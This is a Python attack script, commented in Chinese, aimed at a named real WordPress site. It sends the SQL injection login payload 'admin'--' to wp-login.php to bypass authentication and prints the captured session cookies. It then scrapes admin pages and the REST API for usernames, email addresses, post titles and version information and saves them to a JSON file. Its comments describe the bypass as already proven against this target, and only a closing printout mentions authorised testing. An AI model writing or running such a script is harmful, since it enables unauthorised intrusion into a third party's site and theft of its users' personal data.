#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Final Data Extractor - 最终数据提取器
完全复制之前成功的认证绕过方法
"""

import requests
import json
import time
import re
from urllib.parse import urljoin, urlparse

class FinalDataExtractor:
    """最终数据提取器"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
    def extract_form_fields(self, login_url: str) -> dict:
        """提取表单字段 - 复制之前成功的方法"""
        try:
            response = self.session.get(login_url, timeout=15)
            content = response.text
            
            # 查找表单字段 - 使用之前成功的模式
            form_fields = {}
            
            # 用户名字段 - 之前发现的是 'loginform'
            username_patterns = [
                r'name=["\']([^"\']*loginform[^"\']*)["\']',
                r'name=["\']([^"\']*username[^"\']*)["\']',
                r'name=["\']([^"\']*user[^"\']*)["\']',
                r'name=["\']([^"\']*email[^"\']*)["\']',
                r'name=["\']([^"\']*log[^"\']*)["\']'
            ]
            
            for pattern in username_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    form_fields["username_field"] = matches[0]
                    break
            
            # 密码字段 - 之前发现的是 'pwd'
            password_patterns = [
                r'name=["\']([^"\']*pwd[^"\']*)["\']',
                r'name=["\']([^"\']*password[^"\']*)["\']',
                r'name=["\']([^"\']*pass[^"\']*)["\']'
            ]
            
            for pattern in password_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    form_fields["password_field"] = matches[0]
                    break
            
            # 表单action - 之前是 wp-login.php
            action_pattern = r'action=["\']([^"\']*)["\']'
            action_matches = re.findall(action_pattern, content, re.IGNORECASE)
            if action_matches:
                form_fields["action"] = urljoin(login_url, action_matches[0])
            else:
                form_fields["action"] = login_url
            
            # 表单方法
            method_pattern = r'method=["\']([^"\']*)["\']'
            method_matches = re.findall(method_pattern, content, re.IGNORECASE)
            form_fields["method"] = method_matches[0] if method_matches else "POST"
            
            return form_fields
            
        except Exception as e:
            print(f"    ❌ 提取表单字段失败: {str(e)}")
            return {"username_field": "loginform", "password_field": "pwd", "action": f"{self.target_url}/wp-login.php", "method": "POST"}
    
    def login_with_exact_bypass(self) -> bool:
        """使用完全相同的认证绕过方法"""
        print("🔓 使用已验证的认证绕过方法...")
        
        try:
            # 使用之前成功的登录端点
            login_url = f"{self.target_url}/wp-login.php"
            
            # 提取表单字段
            form_fields = self.extract_form_fields(login_url)
            print(f"    📝 表单字段: {form_fields}")
            
            # 使用之前成功的载荷和方法
            login_data = {
                form_fields["username_field"]: "admin'--",  # 成功的载荷
                form_fields["password_field"]: "anything123"
            }
            
            # 发送登录请求 - 完全复制之前的方法
            if form_fields.get("method", "POST").upper() == "POST":
                response = self.session.post(form_fields["action"], data=login_data, timeout=15)
            else:
                response = self.session.get(form_fields["action"], params=login_data, timeout=15)
            
            # 使用之前相同的检测方法
            success_indicators = [
                "dashboard", "welcome", "admin", "logout", "profile",
                "仪表板", "欢迎", "管理员", "退出", "个人资料"
            ]
            
            content_lower = response.text.lower()
            
            # 检查成功指标
            if any(indicator in content_lower for indicator in success_indicators):
                print("    ✅ 认证绕过成功!")
                print(f"    🍪 会话Cookies: {dict(self.session.cookies)}")
                return True
            
            # 检查状态码和URL
            if response.status_code == 200 and "wp-login" not in response.url:
                print("    ✅ 认证绕过成功!")
                return True
                
        except Exception as e:
            print(f"    ❌ 登录异常: {str(e)}")
        
        print("    ❌ 认证绕过失败")
        return False
    
    def extract_accessible_data(self) -> dict:
        """提取可访问的数据"""
        print("📊 提取可访问的数据...")
        
        extracted_data = {
            "users": [],
            "posts": [],
            "pages": [],
            "system_info": {},
            "accessible_endpoints": []
        }
        
        # 测试可访问的端点
        test_endpoints = [
            f"{self.target_url}/wp-admin/",
            f"{self.target_url}/wp-admin/users.php",
            f"{self.target_url}/wp-admin/edit.php",
            f"{self.target_url}/wp-admin/profile.php",
            f"{self.target_url}/wp-json/wp/v2/users",
            f"{self.target_url}/wp-json/wp/v2/posts",
            f"{self.target_url}/wp-json/wp/v2/pages"
        ]
        
        for endpoint in test_endpoints:
            try:
                response = self.session.get(endpoint, timeout=10)
                
                if response.status_code == 200:
                    extracted_data["accessible_endpoints"].append(endpoint)
                    
                    # 尝试解析不同类型的数据
                    if "users.php" in endpoint:
                        users = self._parse_users_page(response.text)
                        extracted_data["users"].extend(users)
                        print(f"    👥 从 {endpoint} 提取用户: {len(users)}个")
                    
                    elif "edit.php" in endpoint:
                        posts = self._parse_edit_page(response.text)
                        extracted_data["posts"].extend(posts)
                        print(f"    📝 从 {endpoint} 提取内容: {len(posts)}个")
                    
                    elif "wp-json" in endpoint and "users" in endpoint:
                        try:
                            json_data = response.json()
                            if isinstance(json_data, list):
                                for user in json_data[:10]:
                                    extracted_data["users"].append({
                                        "id": user.get("id"),
                                        "username": user.get("slug", ""),
                                        "name": user.get("name", ""),
                                        "source": "json_api"
                                    })
                                print(f"    👥 从API提取用户: {len(json_data)}个")
                        except:
                            pass
                    
                    elif "wp-admin/" in endpoint and len(response.text) > 1000:
                        # 提取系统信息
                        system_info = self._extract_system_info(response.text)
                        if system_info:
                            extracted_data["system_info"].update(system_info)
                            print(f"    💾 提取系统信息")
                        
            except Exception as e:
                continue
        
        return extracted_data
    
    def _parse_users_page(self, html_content: str) -> list:
        """解析用户页面"""
        users = []
        
        # 查找用户信息的模式
        user_patterns = [
            r'<strong[^>]*><a[^>]*>([^<]+)</a></strong>.*?<td[^>]*>([^<]+)</td>',
            r'<td[^>]*class="[^"]*username[^"]*"[^>]*>([^<]+)</td>',
            r'<a[^>]*href="mailto:([^"]+)"[^>]*>'
        ]
        
        for pattern in user_patterns:
            matches = re.findall(pattern, html_content, re.DOTALL | re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple) and len(match) >= 2:
                    users.append({
                        "username": match[0].strip(),
                        "email": match[1].strip() if "@" in match[1] else "",
                        "source": "admin_page"
                    })
                elif isinstance(match, str) and "@" in match:
                    users.append({
                        "email": match.strip(),
                        "source": "admin_page"
                    })
        
        return users[:10]  # 限制数量
    
    def _parse_edit_page(self, html_content: str) -> list:
        """解析编辑页面"""
        content_items = []
        
        # 查找文章/页面标题
        title_pattern = r'<strong[^>]*><a[^>]*>([^<]+)</a></strong>'
        titles = re.findall(title_pattern, html_content, re.IGNORECASE)
        
        for title in titles[:20]:
            content_items.append({
                "title": title.strip(),
                "source": "edit_page"
            })
        
        return content_items
    
    def _extract_system_info(self, html_content: str) -> dict:
        """提取系统信息"""
        info = {}
        
        # WordPress版本
        version_pattern = r'WordPress\s+([0-9.]+)'
        version_match = re.search(version_pattern, html_content, re.IGNORECASE)
        if version_match:
            info["wordpress_version"] = version_match.group(1)
        
        # 站点标题
        title_pattern = r'<title>([^<]+)</title>'
        title_match = re.search(title_pattern, html_content)
        if title_match:
            info["site_title"] = title_match.group(1)
        
        return info
    
    def run_extraction(self) -> dict:
        """运行完整的数据提取"""
        print(f"🎯 最终数据提取: {self.target_url}")
        print("=" * 50)
        
        # 1. 认证绕过
        if not self.login_with_exact_bypass():
            return {"error": "认证绕过失败"}
        
        # 2. 提取数据
        data = self.extract_accessible_data()
        
        # 3. 构造结果
        result = {
            "target": self.target_url,
            "extraction_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "authentication_status": "bypassed",
            "extracted_data": data,
            "summary": {
                "users_found": len(data.get("users", [])),
                "content_items_found": len(data.get("posts", [])) + len(data.get("pages", [])),
                "accessible_endpoints": len(data.get("accessible_endpoints", [])),
                "system_info_available": bool(data.get("system_info"))
            }
        }
        
        return result

def main():
    """主函数"""
    target = "https://peacoop.or.th"
    
    print("📊 最终数据提取器")
    print("=" * 50)
    print(f"目标: {target}")
    print("使用完全相同的认证绕过方法")
    print("=" * 50)
    
    extractor = FinalDataExtractor(target)
    result = extractor.run_extraction()
    
    if "error" in result:
        print(f"\n❌ 提取失败: {result['error']}")
        return
    
    # 保存结果
    timestamp = int(time.time())
    result_file = f"final_extracted_data_{timestamp}.json"
    
    with open(result_file, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)
    
    # 打印结果
    print("\n" + "=" * 50)
    print("📊 数据提取结果")
    print("=" * 50)
    
    summary = result["summary"]
    data = result["extracted_data"]
    
    print(f"👥 用户: {summary['users_found']}个")
    print(f"📝 内容: {summary['content_items_found']}个")
    print(f"🔗 可访问端点: {summary['accessible_endpoints']}个")
    print(f"💾 系统信息: {'有' if summary['system_info_available'] else '无'}")
    
    # 显示详细信息
    if data.get("users"):
        print(f"\n👥 用户详情:")
        for i, user in enumerate(data["users"][:3]):
            if user.get("username"):
                print(f"  {i+1}. {user['username']}")
            if user.get("email"):
                print(f"     📧 {user['email']}")
    
    if data.get("posts"):
        print(f"\n📝 内容示例:")
        for i, item in enumerate(data["posts"][:3]):
            if item.get("title"):
                print(f"  {i+1}. {item['title'][:50]}...")
    
    if data.get("system_info"):
        print(f"\n💾 系统信息:")
        sys_info = data["system_info"]
        if sys_info.get("wordpress_version"):
            print(f"  WordPress版本: {sys_info['wordpress_version']}")
        if sys_info.get("site_title"):
            print(f"  站点标题: {sys_info['site_title']}")
    
    print(f"\n📄 完整数据已保存到: {result_file}")
    print("=" * 50)
    
    print("\n⚠️ 重要说明:")
    print("这些数据是通过认证绕过从目标网站实际提取的")
    print("请负责任地使用，仅用于授权的安全测试")

if __name__ == "__main__":
    main()